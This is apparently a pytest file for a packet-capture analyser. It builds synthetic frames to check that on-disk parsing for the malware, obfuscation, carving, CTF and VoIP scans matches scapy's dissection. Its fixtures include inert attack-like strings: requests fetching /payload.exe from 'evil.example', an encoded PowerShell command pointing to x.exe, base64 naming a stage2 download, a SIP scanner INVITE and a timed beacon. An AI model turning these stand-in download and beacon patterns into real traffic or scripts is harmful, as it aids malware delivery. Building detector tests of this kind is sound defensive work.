"""The malware, obfuscation, carving, CTF and VoIP analyses read lite records
from disk: what each reads from a record whose only TCP/UDP layer carries a
``Raw`` payload (or nothing) comes from its bytes, and everything else is
dissected. Their results must equal the ones computed over scapy packets (in
memory), record for record.

These scans read payloads on every port, and three of them read Ethernet
padding as scapy hands it to them: CTF and VoIP take the padding behind an
empty segment as its payload, malware the padding behind a load as part of it.
The edge capture holds padding that is NUL, padding that is not, and padding
that carries text the scans look for."""

from __future__ import annotations

import base64
import shutil
from pathlib import Path

import pytest

pytest.importorskip("scapy")

from scapy.all import (  # noqa: E402
    ARP,
    DNS,
    DNSQR,
    ICMP,
    IP,
    TCP,
    UDP,
    Dot1Q,
    Ether,
    IPOption_RR,
    IPv6,
    Raw,
    wrpcap,
)
from test_lite_it_paths import _frames as _it_frames  # noqa: E402

from pcapper import carving, ctf, malware, obfuscation, pcap_cache, utils, voip  # noqa: E402
from pcapper.carving import analyze_carving  # noqa: E402
from pcapper.ctf import analyze_ctf  # noqa: E402
from pcapper.lite import UNSUPPORTED, LitePacket  # noqa: E402
from pcapper.malware import analyze_malware  # noqa: E402
from pcapper.obfuscation import analyze_obfuscation  # noqa: E402
from pcapper.voip import analyze_voip  # noqa: E402

DATA = Path(__file__).parent / "data"

A, B = "10.0.0.1", "10.0.0.2"
C, D = "10.0.0.5", "93.184.216.34"  # an internal host and a public server
PHONE, PBX = "10.0.0.7", "10.0.0.8"
ETH = Ether(src="00:11:22:33:44:55", dst="66:77:88:99:aa:bb")
NUL6 = b"\x00" * 6  # the padding behind a bare 54-byte segment


def _tail(frame, tail: bytes):  # type: ignore[no-untyped-def]
    """``frame`` with ``tail`` past its IP (or UDP) length: scapy's Padding."""
    return Ether(bytes(frame) + tail)


def _tcp(src: str, dst: str, sport: int, dport: int, load: bytes = b"", **kw):  # type: ignore[no-untyped-def]
    frame = ETH / IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="PA" if load else "A", **kw)
    return frame / Raw(load) if load else frame


def _udp(src: str, dst: str, sport: int, dport: int, load: bytes = b"", **kw):  # type: ignore[no-untyped-def]
    frame = ETH / IP(src=src, dst=dst) / UDP(sport=sport, dport=dport, **kw)
    return frame / Raw(load) if load else frame


def _rtp(seq: int, pt: int, payload: bytes, marker: bool = False) -> bytes:
    return (
        bytes([0x80, (0x80 if marker else 0) | pt])
        + seq.to_bytes(2, "big")
        + (seq * 160).to_bytes(4, "big")
        + (0x1234ABCD).to_bytes(4, "big")
        + payload
    )


SDP = (
    "v=0\r\no=- 1 1 IN IP4 10.0.0.7\r\ns=-\r\nc=IN IP4 10.0.0.7\r\nt=0 0\r\n"
    "m=audio 40100 RTP/AVP 0 101\r\na=rtpmap:0 PCMU/8000\r\n"
    "a=rtpmap:101 telephone-event/8000\r\n"
)
INVITE = (
    "INVITE sip:900123@10.0.0.8 SIP/2.0\r\n"
    "Via: SIP/2.0/UDP 10.0.0.7:5062;branch=z9hG4bK1\r\n"
    "From: <sip:alice@10.0.0.8>;tag=1\r\nTo: <sip:900123@10.0.0.8>\r\n"
    "Call-ID: lite-call-1\r\nCSeq: 1 INVITE\r\n"
    'Authorization: Digest username="alice", realm="pbx", nonce="abc", '
    'uri="sip:900123@10.0.0.8", response="0123456789abcdef0123456789abcdef", algorithm=MD5\r\n'
    "User-Agent: friendly-scanner\r\nContent-Type: application/sdp\r\n"
    f"Content-Length: {len(SDP)}\r\n\r\n{SDP}"
)
OPTIONS = (
    "OPTIONS sip:100@10.0.0.8 SIP/2.0\r\nCall-ID: in-the-padding\r\n"
    "From: <sip:scan@10.0.0.7>\r\nTo: <sip:100@10.0.0.8>\r\nCSeq: 1 OPTIONS\r\n\r\n"
)


def _payload_frames() -> list:
    b64_flag = base64.b64encode(b"flag{uri_flag}").decode()
    binary = bytes(range(256))
    frames = [
        # CTF: a wrapper split by a NUL-padded empty segment of the same flow
        # (the padding runs into the flow's tail and breaks the match) ...
        _tcp(A, B, 41000, 9001, b"xx fla", seq=1),
        _tail(_tcp(A, B, 41000, 9001, seq=7), NUL6),
        _tcp(A, B, 41000, 9001, b"g{split_by_padding}", seq=7),
        # ... a wrapper left in a flow's tail and reported again for each
        # padding-only segment behind it, but not for an unpadded one ...
        _tcp(A, B, 41001, 9002, b"flag{tail_flag_1234}"),
        _tail(_tcp(A, B, 41001, 9002), NUL6),
        _tcp(A, B, 41001, 9002),
        # ... and wrappers in the padding of an empty segment / datagram, and
        # behind a UDP length that cuts the payload short.
        _tail(_tcp(A, B, 41002, 9003), b"flag{in_the_padding}"),
        _tail(_udp(A, B, 41003, 9004), b"flag{udp_padding_x}"),
        _tail(_udp(A, B, 41004, 9005, b"abcdflag{udp_len_cut}", len=12), b"\x00" * 4),
        ETH / IP(src=A, dst=B) / UDP(sport=41005, dport=53)
        / DNS(rd=1, qd=DNSQR(qname="ZmxhZ3tkbnNfZmxhZ30.example.com")),
        ETH / IP(src=A, dst=B) / ICMP() / Raw(b"flag{icmp_flag}"),
        _tcp(A, B, 41006, 8000, f"GET /?d={b64_flag} HTTP/1.1\r\nAuthorization: Basic YWRtaW46czNjcjN0\r\n\r\n".encode()),
        # Malware: a download, an upload, tooling words behind a short load
        # (bytes(pkt[Raw]) runs on into the padding), DNS, ARP, and a beacon.
        _tcp(C, D, 41010, 80, b"GET /payload.exe HTTP/1.1\r\nHost: evil.example\r\n\r\n"),
        _tcp(C, D, 41011, 8080, b"POST /up HTTP/1.1\r\nHost: evil.example\r\n\r\n"),
        _tail(_tcp(C, B, 41012, 4444, b"ok"), b" powershell -enc SQBFAFgA https://evil.example/x.exe"),
        _tail(_tcp(C, D, 41013, 443), NUL6),
        ETH / ARP(op=1, psrc=C, pdst=B),
        # Obfuscation: loads of 63 and 64 bytes, high entropy, a hex token, a
        # UDP length that keeps a long datagram's load short, an ICMP payload
        # and base64 that decodes to an IOC.
        _tcp(C, D, 41020, 8081, bytes(range(100, 163))),
        _tcp(C, D, 41020, 8081, bytes(range(64, 128))),
        _tcp(C, D, 41021, 8082, binary),
        _udp(C, D, 41022, 9999, bytes(range(50)).hex().encode()),
        _tail(_udp(C, D, 41023, 9998, binary[:40], len=48), binary[40:120]),
        ETH / IP(src=C, dst=D) / ICMP() / Raw(base64.b64encode(binary[128:200])),
        _tcp(C, D, 41024, 8083, b"x=" + base64.b64encode(b"download from http://evil.example/stage2 now please")),
        # Carving: a PDF whose first segment is padded (only the load is
        # stream data), a signature on port 0, VLAN, IPv6 and IP options.
        _tail(_tcp(A, B, 41040, 41041, b"%PDF-", seq=100), b"\x07"),
        _tcp(A, B, 41040, 41041, b"1.4\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF\n", seq=105),
        _tcp(A, B, 0, 41042, b"PK\x03\x04" + b"\x00" * 26),
        ETH / Dot1Q(vlan=7) / IP(src=A, dst=B) / TCP(sport=41043, dport=41044, seq=(1 << 32) - 1) / Raw(b"GIF89a" + b"\x01" * 20 + b"\x3b"),
        ETH / IPv6(src="fe80::1", dst="fe80::2") / TCP(sport=41045, dport=41046, seq=0) / Raw(b"%PDF-1.5 v6 %%EOF\n"),
        ETH / IP(src=A, dst=B, options=[IPOption_RR()]) / TCP(sport=41047, dport=41048) / Raw(b"%PDF-1.6 opts %%EOF\n"),
        # VoIP: SIP on a non-standard port announcing RTP, the media (and
        # DTMF) on the port it learned, an empty segment on the MEGACO port
        # (its padding is counted as a message), SIP text in a segment's
        # padding, a padded RTP datagram, STUN and SIP on 5060.
        _udp(PHONE, PBX, 5062, 5062, INVITE.encode()),
        _udp(PHONE, PBX, 40100, 40102, _rtp(1, 0, b"\xff" * 160, marker=True)),
        _udp(PHONE, PBX, 40100, 40102, _rtp(2, 0, b"\x7f" * 160)),
        _udp(PHONE, PBX, 40100, 40102, _rtp(3, 101, bytes([5, 0x0A, 0, 160]), marker=True)),
        _tail(_udp(PHONE, PBX, 40100, 40102, _rtp(4, 101, bytes([5, 0x8A, 1, 64]))), b"\x00" * 2),
        _tail(_tcp(PHONE, PBX, 41030, 2944), NUL6),
        _tail(_tcp(PHONE, PBX, 41031, 5070), OPTIONS.encode()),
        _udp(PHONE, PBX, 41032, 3478, bytes.fromhex("0001000021124a42") + b"\x01" * 12),
        _udp(PHONE, PBX, 5060, 5060, INVITE.replace("lite-call-1", "lite-call-2").encode()),
    ]
    beacon = [_tail(_tcp(C, D, 41050, 8443, seq=k), NUL6) for k in range(7)]
    for index, frame in enumerate(frames):
        frame.time = 1700000000 + index * 0.25
    for k, frame in enumerate(beacon):
        frame.time = 1700000100 + 60 * k
    return frames + beacon


def _frames() -> list:
    return _it_frames() + _payload_frames()


@pytest.fixture()
def capture(tmp_path: Path) -> Path:
    path = tmp_path / "edge.pcap"
    wrpcap(str(path), _frames())
    return path


@pytest.fixture(autouse=True)
def _fresh(monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setenv("PCAPPER_CACHE_ENABLED", "0")
    utils.clear_analysis_memo()
    pcap_cache._PACKET_CACHE.clear()
    yield
    utils.clear_analysis_memo()
    pcap_cache._PACKET_CACHE.clear()


FIXTURES = (
    "mixed.pcap", "mixed.pcapng", "http.pcap", "dns.pcap", "tls.pcap", "truncated.pcap",
    "voip.pcap", "voip_attack.pcap", "voip_multiproto.pcap", "carve_gap.pcap", "carve_wrap.pcap",
    "modbus.pcap",
)


def _captures(tmp_path: Path, capture: Path) -> list[Path]:
    paths = [capture]
    for name in FIXTURES:
        target = tmp_path / name
        shutil.copy(DATA / name, target)
        paths.append(target)
    return paths


@pytest.mark.parametrize(
    "analyze, kwargs",
    [
        (analyze_malware, {}),
        (analyze_obfuscation, {}),
        (analyze_carving, {}),
        (analyze_ctf, {}),
        (analyze_voip, {}),
        (analyze_voip, {"target_ip": PBX}),
    ],
    ids=["malware", "obfuscation", "carving", "ctf", "voip", "voip-target"],
)
def test_from_disk_equals_scapy_packets(tmp_path: Path, capture: Path, analyze, kwargs) -> None:  # type: ignore[no-untyped-def]
    for path in _captures(tmp_path, capture):
        utils.clear_analysis_memo()
        from_disk = analyze(path, show_status=False, **kwargs)
        packets, meta = pcap_cache.load_packets(path, show_status=False)
        assert packets and not isinstance(packets[0], LitePacket)
        utils.clear_analysis_memo()
        in_memory = analyze(path, show_status=False, packets=packets, meta=meta, **kwargs)
        assert repr(from_disk) == repr(in_memory), path.name  # the whole summary


def test_the_edge_capture_finds_what_it_was_built_for(capture: Path) -> None:
    """The padding the scapy paths read is really read: the results the edge
    capture exists for are there (from disk, i.e. through the lite paths)."""
    found = analyze_ctf(capture, show_status=False)
    assert {"flag{in_the_padding}", "flag{udp_padding_x}", "flag{tail_flag_1234}"} <= set(found.token_counts)
    assert "flag{split_by_padding}" not in found.token_counts  # NULs broke the tail
    assert "flag{udp_len_cut}" not in found.token_counts  # past the UDP length
    assert found.deterministic_checks["stream_reassembled_match"]
    utils.clear_analysis_memo()
    summary = analyze_voip(capture, show_status=False)
    assert summary.protocols["MEGACO/H.248"]  # an empty segment's padding, counted
    assert summary.request_counts["OPTIONS"]  # SIP read from a segment's padding
    utils.clear_analysis_memo()
    checks = analyze_malware(capture, show_status=False).deterministic_checks
    assert any("PowerShell" in item for item in checks["malware_tooling"])  # behind a 2-byte load
    assert checks["beaconing_or_c2"]


def _kinds(path: Path) -> set[str]:
    kinds = set()
    for record in pcap_cache.iter_packets(path, show_status=False, lite=True):
        l4 = record.lite_l4()
        if l4 is UNSUPPORTED:
            kinds.add("unsupported")
        elif l4 is None:
            kinds.add("no-l4")
        elif l4[5] < 0:
            kinds.add("app-layer")
        elif l4[6] > l4[5]:
            kinds.add("raw+padding" if len(record.original) > l4[6] else "raw")
        else:
            tail = record.original[l4[6] :]
            kinds.add(("nul-padding" if not tail.strip(b"\x00") else "padding") if tail else "empty")
            if not l4[0] and tail:
                kinds.add("udp-empty+tail")
    return kinds


def test_the_edge_capture_reaches_every_path(capture: Path) -> None:
    assert {
        "unsupported", "no-l4", "app-layer", "raw", "raw+padding", "empty", "nul-padding", "padding",
        "udp-empty+tail",
    } <= _kinds(capture)


def _scapy_answers(pkt) -> dict:  # type: ignore[no-untyped-def]
    """What each loop reads from a scapy packet, by the loops' own statements."""
    out: dict = {}
    tcp = pkt.getlayer(TCP)
    raw = tcp.getlayer(Raw) if tcp is not None else None
    payload = bytes(raw.load) if raw is not None else b""
    if tcp is None or raw is None or not payload:
        out["carving"] = None
    else:
        out["carving"] = (
            int(getattr(tcp, "sport", 0) or 0),
            int(getattr(tcp, "dport", 0) or 0),
            int(getattr(tcp, "seq", 0) or 0),
            payload,
        )
    proto, sport, dport = "IP", 0, 0
    if pkt.haslayer(TCP):
        proto, sport, dport = "TCP", int(pkt[TCP].sport or 0), int(pkt[TCP].dport or 0)
    elif pkt.haslayer(UDP):
        proto, sport, dport = "UDP", int(pkt[UDP].sport or 0), int(pkt[UDP].dport or 0)
    has_raw = pkt.haslayer(Raw)
    out["malware"] = (proto, sport, dport, bytes(pkt[Raw]) if has_raw else b"")
    out["obfuscation"] = (proto, sport, dport, bytes(pkt[Raw].load) if has_raw else b"")
    out["ctf"] = (ctf._proto_label(pkt), ctf._extract_payload(pkt))
    out["dns"] = bool(pkt.haslayer(DNS))
    is_udp, is_tcp = bool(pkt.haslayer(UDP)), bool(pkt.haslayer(TCP))
    if not is_udp and not is_tcp:
        out["voip"] = None
    else:
        layer = pkt[UDP] if is_udp else pkt[TCP]
        out["voip"] = (is_udp, int(layer.sport or 0), int(layer.dport or 0), voip._transport_payload(pkt, layer))
        out["voip_is_tcp"] = is_tcp
    return out


def test_lite_answers_match_scapy_record_for_record(tmp_path: Path, capture: Path) -> None:
    """Every answer a loop takes from a record's bytes is the one its scapy
    statements give on the dissected record; a record the lite reads skip
    is one those statements skip too."""
    answered = {"carving": 0, "malware": 0, "obfuscation": 0, "ctf": 0, "voip": 0}
    for path in _captures(tmp_path, capture):
        for record in pcap_cache.iter_packets(path, show_status=False, lite=True):
            scapy = _scapy_answers(record.materialize())
            segment = carving._lite_segment(record)
            if segment is not UNSUPPORTED:
                assert segment == scapy["carving"], path.name
                answered["carving"] += segment is not None
            for name, module in (("malware", malware), ("obfuscation", obfuscation)):
                view = module._lite_view(record)
                if view is not None:
                    assert view == scapy[name], (name, path.name)
                    assert not scapy["dns"]
                    answered[name] += 1
            view = ctf._lite_view(record)
            if view is not None:
                assert view == scapy["ctf"] and not scapy["dns"], path.name
                answered["ctf"] += 1
            view = voip._lite_view(record)
            if view is not UNSUPPORTED:
                assert view == scapy["voip"], path.name
                if view is not None:
                    assert scapy["voip_is_tcp"] is (not view[0])
                    answered["voip"] += 1
    assert all(answered.values()), answered
